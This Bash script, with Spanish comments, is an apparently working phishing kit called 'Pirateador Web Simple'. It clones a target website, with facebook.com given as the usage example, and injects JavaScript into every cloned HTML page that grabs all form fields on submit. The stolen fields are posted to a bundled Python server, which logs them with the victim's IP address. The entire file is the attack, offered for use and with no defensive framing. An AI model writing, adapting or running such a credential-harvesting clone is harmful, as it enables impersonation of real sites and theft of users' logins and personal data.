#!/bin/bash
# File: /home/hacker/quesofr33/pirateador.sh
# Pirateador Web Simple - Clonador y Servidor HTTP
# Autor: OIHEC - 2025

# Colores
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

# Variables
TARGET_URL=""
PORT="80"
CLONE_DIR=""

# Banner
show_banner() {
    echo -e "${CYAN}"
    echo "================================================================"
    echo "|               🏴‍☠️ PIRATEADOR WEB SIMPLE 🏴‍☠️                |"
    echo "|            Clonador + Servidor HTTP en Bash                 |"
    echo "|                    by OIHEC - 2025                          |"
    echo "================================================================"
    echo -e "${NC}"
}

# Menú
show_menu() {
    echo -e "${YELLOW}Uso: ./pirateador.sh <url_objetivo> [puerto]"
    echo -e "Ejemplo: ./pirateador.sh https://facebook.com"
    echo -e "Ejemplo: ./pirateador.sh https://facebook.com 8080${NC}"
}

# Log simple
log_msg() {
    echo -e "${GREEN}[$(date '+%H:%M:%S')]${NC} $1"
}

# Verificar dependencias básicas
check_deps() {
    if ! command -v wget &> /dev/null && ! command -v curl &> /dev/null; then
        echo -e "${RED}❌ Error: Se necesita wget o curl${NC}"
        echo -e "${YELLOW}Instala con: sudo apt install wget curl${NC}"
        exit 1
    fi
    
    if ! command -v python3 &> /dev/null; then
        echo -e "${RED}❌ Error: Se necesita python3${NC}"
        echo -e "${YELLOW}Instala con: sudo apt install python3${NC}"
        exit 1
    fi
}

# Extraer dominio
extract_domain() {
    echo "$1" | sed 's|https\?://||' | sed 's|/.*||' | sed 's|:.*||'
}

# Clonar con wget
clone_wget() {
    local domain=$(extract_domain "$TARGET_URL")
    CLONE_DIR="cloned_$(echo $domain | tr '.' '_')_$(date +%s)"
    
    log_msg "🚀 Clonando $TARGET_URL con wget..."
    
    wget --recursive --level=2 --no-clobber --page-requisites \
         --html-extension --convert-links --domains="$domain" \
         --no-parent --user-agent="Mozilla/5.0" --no-check-certificate \
         --timeout=30 --tries=2 --directory-prefix="$CLONE_DIR" \
         --reject="*.pdf,*.zip,*.exe" "$TARGET_URL" &>/dev/null
    
    if [ $? -eq 0 ] || [ $? -eq 8 ]; then
        log_msg "✅ Clonado completado"
        return 0
    else
        log_msg "⚠️ Wget falló, intentando curl..."
        return 1
    fi
}

# Clonar con curl (fallback)
clone_curl() {
    local domain=$(extract_domain "$TARGET_URL")
    CLONE_DIR="cloned_$(echo $domain | tr '.' '_')_$(date +%s)"
    
    mkdir -p "$CLONE_DIR"
    
    log_msg "🚀 Clonando con curl..."
    
    curl -L -k -s -A "Mozilla/5.0" --connect-timeout 30 \
         -o "$CLONE_DIR/index.html" "$TARGET_URL"
    
    if [ $? -eq 0 ] && [ -f "$CLONE_DIR/index.html" ]; then
        log_msg "✅ Página principal descargada"
        return 0
    else
        log_msg "❌ Error con curl"
        return 1
    fi
}

# Modificar archivos para captura
add_capture() {
    log_msg "🔧 Añadiendo captura de datos..."
    
    find "$CLONE_DIR" -name "*.html" | while read file; do
        # Añadir script de captura simple
        cat >> "$file" << 'SCRIPT'
<script>
document.addEventListener('DOMContentLoaded', function() {
    var forms = document.querySelectorAll('form');
    forms.forEach(function(form) {
        form.addEventListener('submit', function(e) {
            var data = new FormData(form);
            var obj = {};
            for (var pair of data.entries()) {
                obj[pair[0]] = pair[1];
            }
            fetch('/capture', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(obj)
            }).catch(function(){});
        });
    });
});
</script>
SCRIPT
    done
}

# Crear servidor Python simple
create_server() {
    cat > "$CLONE_DIR/server.py" << 'PYSERVER'
#!/usr/bin/env python3
import http.server
import socketserver
import json
import sys
import os
from datetime import datetime

PORT = int(sys.argv[1]) if len(sys.argv) > 1 else 80

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == '/capture':
            length = int(self.headers.get('Content-Length', 0))
            data = self.rfile.read(length)
            try:
                parsed = json.loads(data.decode())
                timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                ip = self.client_address[0]
                print(f"[CAPTURE] {timestamp} - {ip} - {parsed}")
                with open('captured.log', 'a') as f:
                    f.write(f"{timestamp} - {ip} - {json.dumps(parsed)}\n")
            except:
                pass
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'OK')
        else:
            super().do_POST()

if __name__ == "__main__":
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print(f"Servidor iniciado en puerto {PORT}")
        httpd.serve_forever()
PYSERVER

    chmod +x "$CLONE_DIR/server.py"
}

# Iniciar servidor
start_server() {
    log_msg "🌐 Iniciando servidor en puerto $PORT..."
    
    cd "$CLONE_DIR"
    
    # Buscar directorio del sitio clonado
    if [ -d "$(extract_domain "$TARGET_URL")" ]; then
        cd "$(extract_domain "$TARGET_URL")"
    fi
    
    echo -e "${GREEN}✅ Servidor iniciado: http://localhost:$PORT${NC}"
    echo -e "${YELLOW}📋 Presiona Ctrl+C para detener${NC}"
    echo -e "${CYAN}📊 Los datos capturados se guardan en captured.log${NC}"
    
    python3 ../server.py "$PORT" 2>/dev/null
}

# Limpieza al salir
cleanup() {
    echo -e "\n${YELLOW}🧹 Limpiando...${NC}"
    if [ -n "$CLONE_DIR" ] && [ -d "$CLONE_DIR" ]; then
        echo -e "${BLUE}📁 Directorio clonado: $CLONE_DIR${NC}"
        echo -e "${BLUE}📄 Logs en: $CLONE_DIR/captured.log${NC}"
    fi
    exit 0
}

# Función principal
main() {
    # Verificar argumentos
    if [ $# -lt 1 ]; then
        show_banner
        show_menu
        exit 1
    fi
    
    TARGET_URL="$1"
    PORT="${2:-80}"
    
    # Configurar trap para limpieza
    trap cleanup SIGINT SIGTERM
    
    show_banner
    check_deps
    
    log_msg "🎯 Objetivo: $TARGET_URL"
    log_msg "🔌 Puerto: $PORT"
    
    # Clonar sitio
    if ! clone_wget; then
        if ! clone_curl; then
            echo -e "${RED}❌ Error: No se pudo clonar el sitio${NC}"
            exit 1
        fi
    fi
    
    # Modificar archivos
    add_capture
    
    # Crear servidor
    create_server
    
    # Iniciar servidor
    start_server
}

# Ejecutar
main "$@"
